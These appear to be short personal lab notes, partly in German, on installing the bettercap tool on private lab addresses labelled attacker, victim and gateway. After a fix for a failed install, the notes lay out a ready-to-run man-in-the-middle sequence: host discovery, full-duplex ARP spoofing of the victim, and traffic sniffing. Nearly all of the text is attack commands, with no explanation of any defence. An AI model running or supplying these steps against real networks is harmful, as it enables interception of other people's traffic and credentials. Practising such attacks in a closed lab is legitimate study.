attacker=192.168.226.137
victim=192.168.226.138

host=192.168.226.2


sudo apt update
sudo apt install bettercap




$ sudo apt install bettercap
 liefert Fehlermeldung.
 
sudo apt install bettercap --fix-missing -y
 
das funktioniert
 
sudo bettercap
help
help net.probe
net.probe on
net.show
 
help net.recon
net.recon on
net.show

active
 
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.226.138
arp.spoof on

net.sniff on



